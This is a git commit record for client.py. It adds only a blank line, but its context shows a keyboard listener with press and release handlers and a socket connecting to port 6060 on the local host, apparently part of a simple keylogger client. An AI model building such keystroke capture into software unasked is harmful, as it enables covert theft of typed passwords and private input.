2303e11272d9634412514b33d81e866ae2fcc3c4
zahrabytes <bukhaz99@gmail.com>
2024-01-12 10:05:19 -0600

    Update client.py

--- client.py
+++ client.py
@@ -12,6 +12,7 @@ def on_release(key):
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+    
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((socket.gethostname(), 6060))
 
